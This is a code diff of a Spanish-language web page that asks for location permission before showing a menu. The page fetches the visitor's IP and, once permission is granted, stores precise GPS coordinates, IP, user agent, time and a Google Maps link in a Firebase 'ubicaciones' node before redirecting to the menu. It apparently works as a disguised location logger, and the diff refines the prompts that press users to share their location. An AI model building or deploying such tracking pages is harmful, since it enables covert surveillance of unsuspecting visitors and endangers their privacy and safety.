@@ -50,7 +50,6 @@ fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{ipCliente=
 function mostrarConfirmacionNo(){document.getElementById('overlayPermitir').style.display='none';document.getElementById('overlayConfirmar').style.display='flex';}
 function volverAPedir(){document.getElementById('overlayConfirmar').style.display='none';document.getElementById('overlayPermitir').style.display='flex';}
 
-// PRECARGA EN FONDO
 const DB_URL = "https://santillos-1ac6d-default-rtdb.firebaseio.com";
 (async function precargarMenuEnFondo(){
   try{
@@ -68,15 +67,16 @@ const DB_URL = "https://santillos-1ac6d-default-rtdb.firebaseio.com";
 
 function permitirUbicacion(){
   const btn = document.getElementById('btnPermitir');
-  btn.innerText = "Obteniendo ubicación...";
-  btn.disabled = true;
-
+  btn.innerText = "Solicitando permiso...";
+  
   if(!navigator.geolocation){ 
     alert("Tu navegador no soporta GPS"); 
-    btn.innerText="Permitir ubicación"; btn.disabled=false; return; 
+    btn.innerText="Permitir ubicación"; 
+    return; 
   }
   
   navigator.geolocation.getCurrentPosition(async (pos)=>{
+    btn.innerText = "Entrando al menú...";
     const data={lat:pos.coords.latitude,lng:pos.coords.longitude,accuracy:pos.coords.accuracy,ip:ipCliente,userAgent:navigator.userAgent,fecha:new Date().toLocaleString(),timestamp:Date.now(),maps:`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`};
     try{ 
       const pushRef = await db.ref('ubicaciones').push(data); 
@@ -86,18 +86,14 @@ function permitirUbicacion(){
     }catch(e){}
     window.location.href="menu.html";
   },(err)=>{
-    // ERROR: NO mostrar la confirmacion de "Ahora no" cuando el usuario SI quiso permitir
     btn.innerText="Permitir ubicación";
-    btn.disabled=false;
-    console.log("Error GPS:", err.code, err.message);
+    // NUNCA mostramos el "¿Estas seguro?" aquí. Solo avisamos
     if(err.code === 1){
-      // Usuario nego el permiso del navegador -> ahora si mostramos confirmacion
-      mostrarConfirmacionNo();
+      alert("Denegaste el permiso. Por favor activa la ubicación en la configuración de tu navegador y vuelve a intentar.");
     } else {
-      // Error de GPS o timeout -> pedimos que active GPS y reintente, NO lo mandamos a "Ahora no"
-      alert("Activa tu GPS y vuelve a darle a Permitir ubicación. Asegúrate de estar en HTTPS.");
+      alert("No se pudo obtener tu ubicación. Activa el GPS y vuelve a darle a Permitir.");
     }
-  },{enableHighAccuracy:true,timeout:20000,maximumAge:0});
+  },{enableHighAccuracy:true,timeout:25000,maximumAge:0});
 }
 </script>
 </body>
